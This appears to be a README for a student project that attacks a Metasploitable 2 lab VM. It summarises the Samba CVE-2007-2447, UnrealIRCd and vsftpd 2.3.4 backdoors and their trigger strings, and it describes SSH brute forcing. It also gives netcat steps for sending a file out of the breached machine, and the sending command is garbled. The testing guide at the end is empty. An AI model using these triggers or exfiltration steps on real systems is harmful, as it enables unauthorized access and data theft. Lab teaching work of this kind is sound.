# 4240project

## Description:
This project will show a few examples of system penetration. I will be using two virtual machines (both running Ubuntu linux version 22.04) with one running the Metasploitable 2 test environment (https://sourceforge.net/projects/metasploitable/). I have included four python scripts to explore four of the vulnerabilities present on the test environment. Once each script is run (following the proper execution) the user will have full access to the remote system.

When presenting these examples I will be going through these steps
- network scanning 
- vulnerbility assessment
- exploitation
- post-exploitation

## Purpose:
- The purpose of this project is to provide a deeper understanding for learning about system vulnerabilities and the exploitation techiniques used to exploit them. Instead of using the metasploit software to exploit the system vulnerabilites of metasploitable 2, I have created python scripts to do it instead. Doing this helps to gain a detailed explanation as to what is going on behind each exploit attempt. By viewing the documented python code, the user should have a further understanding of system security.

## System Requirements:
- Metasploitable 2
- Virtualbox 
- Preferably running on Ubuntu

## Exploits/Vulnerabilities:

### SAMBA CVE-2007-2447 
- Version: 3.0.20 < 3.0.25rc3
- Desc: Samba is a software that is a re-implmentation of the SMB networking protocol. This software provides file and print services for all clients as long as they are using the SMB protocol .
- Exploit: If Samba is configured to use the non-default username map script, anyone can send arbitrary commands in disguise as a username to the server. The command will then be run without needing authorization.

### UnrealRCD CVE-2010-2075
- Version: 3.2.8.1 
- Desc: UnrealRCD is a daemon for Internet Realy Chat usage in order to provide chat services.
- Exploit: UnrealRCD contains an exploit where it will execute any command send to the service if it begins with the string 'AB'. Ex: AB; [command to run]

### VSFTP CVE-2011-2523
- Version: 2.3.4
- Desc: VSFTP is an FTP server for linux. 
- Exploit: The exploit occurs when a user tries to login with a username that ends with ':)'. This opens a shell on port 6200, allowing the attacker unauthenticated access.

### SSH (BRUTE FORCE EXAMPLE)
- Version: Any.
- Desc: The SSH service allows for communication between a computer network. 
- Exploit: This is less of an exploit and more of poor system security. Users can prevent brute force attacks by incorporating a proper firewall to filter out ip addresses, using public key authentication, using strong and unqiue passwords, etc....

## Payload Examples:
- After gaining access to the remote system and starting a shell session, the user can manually use netcat to search for a specified file. Here is an example:
 - Open a terminal on the local host and run "nc -lnvp [portnum] > [file for info to be stored]"
 - On the remote machine (the breached machine) run the command " [IP of local machine] [portnum] < [file path to be retrieved]

# Guide To Testing:
- Samba:
- SSH:
- UnrealRCD:
- VSFTP: